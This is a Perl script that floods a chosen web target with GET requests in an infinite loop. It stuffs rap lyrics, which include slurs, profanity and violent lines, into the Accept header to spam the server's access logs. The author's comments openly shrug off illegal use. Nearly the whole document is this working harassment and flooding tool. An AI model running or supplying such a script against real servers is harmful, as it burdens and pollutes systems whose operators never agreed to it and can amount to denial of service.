#!/usr/bin/perl

# love_sosa.pl
# Spam an HTTP access log with Mr. Keef quotes.
# don't use this for illegal purposes!
# or use it for illegal purposes, I don't care.
# No copyright for this script.

use v5.36;
use HTTP::Async;
use LWP::UserAgent;
use strict;
use warnings;
my $ua = HTTP::Async->new;

# We gotta do requests the hard way so we can look more elite.
my $request;

if ( $ARGV[0] eq "" ) {
    die "Usage: love_sosa TARGET\n";
}

my $target = $ARGV[0];

my $lyrics = <<EOF;
Love Sosa, bitches love Sosa, huh?
Let them know then, 'Raris and Rovers (huh)
Ayy, lil' Cobra, ayy, ayy
Bang, bang-bang
God, y'all some broke boys, God, y'all some broke boys

These bitches love Sosa, O end or no end
Fuckin' with them O boys, you gon' get fucked over
'Raris and Rovers, these hoes love Chief Sosa
Hit him with that Cobra, now that boy slumped over
They do it all for Sosa, you boys ain't making no noise
Y'all know I'm a grown boy, your clique full of broke boys
God, y'all some broke boys, God, y'all some broke boys
We GBE dope boys, we got lots of dough, boy

These bitches love Sosa and they love them Glo Boys
Know we from the 'Go boy, but we cannot go, boy
No, I don't know old boy, I know he's a broke boy
'Raris and Rovers, convertible Lambo's, boy
You know I got bands, boy, and it's in my pants, boy
Disrespect them O boys, you won't speak again, boy
Don't think that I'm playin', boy, no, we don't use hands, boy
No, we don't do friends, boy, collect bands, I'm a landlord
I gets lots of commas, I can fuck your mama
I ain't with the drama, you can meet my llama
Ridin' with 3hunna, with 300 foreigns
These bitches see Chief Sosa, I swear to God, they honored

These bitches love Sosa, O end or no end
Fuckin' with them O boys, you gon' get fucked over
'Raris and Rovers, these hoes love Chief Sosa
Hit him with that Cobra, now that boy slumped over
They do it all for Sosa, you boys ain't making no noise
Y'all know I'm a grown boy, your clique full of broke boys
God, y'all some broke boys, God, y'all some broke boys
We GBE dope boys, we got lots of dough, boy

Don't make me call D. Rose, boy, he six double-O, boy
And he keep that pole, boy, you gon' get fucked over
Bitch, I did sell soda and I done sell coca'
She gon' clap for Sosa, he gon' clap for Sosa
They do it for Sosa, them hoes, they so off of Sosa
Tadoe off that molly water, so nigga be cool like water
'Fore you get hit with this lava, bitch, I'm the trending topic
Don't care no price, I'll cop it, B, and your bitch steady jockin' me

These bitches love Sosa, O end or no end
Fuckin' with them O boys, you gon' get fucked over
'Raris and Rovers, these hoes love Chief Sosa
Hit him with that Cobra, now that boy slumped over
They do it all for Sosa, you boys ain't making no noise
Y'all know I'm a grown boy, your clique full of broke boys
God, y'all some broke boys, God, y'all some broke boys
We GBE dope boys, we got lots of dough, boy, ha
EOF

$lyrics =~ tr {'\n'} {''};
say "Target: $target";

# print $lyrics;

for ( ; ; ) {
    $ua->add(
	   HTTP::Request->new(
		  "GET", $target,
		  [
			 #"Referer"    => $lyrics,
			 Accept       => $lyrics,
			 "User-Agent" =>
"Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0 ",
		  ]
	   )
    );
    while ( $ua->not_empty ) {
	   if ( my $response = $ua->next_response ) {
		  say $response->code();

		  #		  say $response->content();
	   }
    }
}
